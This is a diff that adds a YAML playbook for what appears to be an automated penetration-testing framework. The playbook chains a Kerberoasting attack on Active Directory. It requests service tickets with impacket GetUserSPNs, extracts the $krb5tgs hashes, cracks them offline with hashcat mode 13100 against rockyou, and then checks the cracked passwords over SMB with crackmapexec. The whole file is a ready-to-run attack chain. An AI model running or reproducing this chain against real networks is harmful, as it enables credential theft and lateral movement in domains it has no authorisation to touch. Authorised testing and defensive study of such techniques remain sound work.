@@ -1,0 +1,67 @@
+name: "Kerberoasting Chain"
+description: "Modern AD attack: request SPN tickets, extract hash, crack offline with hashcat, then use credentials for lateral movement."
+category: ad
+attack_vector: "Kerberoasting — SPN ticket extraction + offline cracking"
+variables:
+  target:
+    required: true
+    description: "Target domain controller IP"
+  domain:
+    required: true
+    description: "AD domain (e.g. corp.local)"
+  user:
+    required: true
+    description: "Domain user with valid creds"
+  password:
+    required: true
+    description: "Password for the user"
+  wordlist:
+    required: false
+    default: "/usr/share/wordlists/rockyou.txt"
+    description: "Wordlist for hashcat"
+cutting_edge: true
+references: ["Attack: Kerberoasting", "HarmJ0y kerberoast", "MITRE ATT&CK T1558.003"]
+
+steps:
+  - name: "get_user_spns"
+    tool: "impacket_tools"
+    description: "Request Service Principal Name tickets (GetUserSPNs.py)"
+    args:
+      tool: "GetUserSPNs"
+      target: "{{domain}}/{{user}}:{{password}} -dc-ip {{target}} -request"
+    expected_output: "\\$krb5tgs|ServicePrincipalName"
+    timeout: 120
+    gate: true
+    retries: 2
+    extracts:
+      - var: "tgs_ticket"
+        regex: "\\$krb5tgs\\$[^\\s]+"
+
+  - name: "crack_kerberoast"
+    tool: "hashcat_crack"
+    description: "Crack the Kerberoast hash offline with hashcat"
+    args:
+      hash_file: "output/get_user_spns.stdout.txt"
+      wordlist: "{{wordlist}}"
+      mode: 13100
+      attack_mode: 0
+    expected_output: "Cracked|Status: Cracked"
+    timeout: 3600
+    gate: false
+    retries: 1
+    extracts:
+      - var: "cracked_password"
+        regex: "(?i)Password\\s*:\\s*(\\S+)"
+
+  - name: "verify_creds"
+    tool: "crackmapexec_exec"
+    description: "Verify cracked credentials against the domain"
+    args:
+      target: "{{target}}"
+      protocol: "smb"
+      username: "{{user}}"
+      password: "{{cracked_password}}"
+    expected_output: "\\[\\+\\].*\\[P\\]|Pwn3d|\\[\\+\\]"
+    timeout: 300
+    gate: false
+    retries: 1
